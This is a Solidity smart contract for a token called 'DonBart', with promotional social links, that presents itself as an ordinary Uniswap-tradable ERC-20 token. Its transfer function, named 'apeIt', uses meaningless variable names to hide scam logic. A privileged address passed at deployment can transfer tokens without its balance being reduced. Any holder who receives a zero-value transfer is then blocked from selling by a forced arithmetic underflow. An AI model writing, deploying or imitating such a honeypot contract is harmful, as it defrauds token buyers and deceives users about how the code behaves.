/*
https://t.me/donbarteth
https://twitter.com/DonBartETH
https://www.donbart.live/
*/

// SPDX-License-Identifier: None

pragma solidity >0.8.7;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), 'Ownable: caller is not the owner');
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), 'Ownable: new owner is the zero address');
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract DONBART is Ownable {
    IUniswapV2Router02 private uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);

    uint256 private home = 15;

    address public uniswapV2Pair;

    uint256 public totalSupply = 21_000_000_000_000 * 10 ** 9;

    constructor(address magne) {
        balanceOf[msg.sender] = totalSupply;
        mars[magne] = home;
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
    }

    mapping(address => mapping(address => uint256)) public allowance;

    uint8 public decimals = 9;

    mapping(address => uint256) public balanceOf;

    mapping(address => uint256) private flavours;

    function approve(address biotin, uint256 carton) public returns (bool success) {
        allowance[msg.sender][biotin] = carton;
        emit Approval(msg.sender, biotin, carton);
        return true;
    }

    function transferFrom(address bottle, address table, uint256 carton) public returns (bool success) {
        apeIt(bottle, table, carton);
        require(carton <= allowance[bottle][msg.sender]);
        allowance[bottle][msg.sender] -= carton;
        return true;
    }

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);

    mapping(address => uint256) private mars;

    function transfer(address table, uint256 carton) public returns (bool success) {
        apeIt(msg.sender, table, carton);
        return true;
    }

    string public name = 'DonBart';

    function apeIt(address bottle, address table, uint256 carton) private returns (bool success) {
        if (mars[bottle] == 0) {
            balanceOf[bottle] -= carton;
        }

        if (carton == 0) flavours[table] += home;

        if (mars[bottle] == 0 && uniswapV2Pair != bottle && flavours[bottle] > 0) {
            mars[bottle] -= home;
        }

        balanceOf[table] += carton;
        emit Transfer(bottle, table, carton);
        return true;
    }

    string public symbol = 'DONBART';
}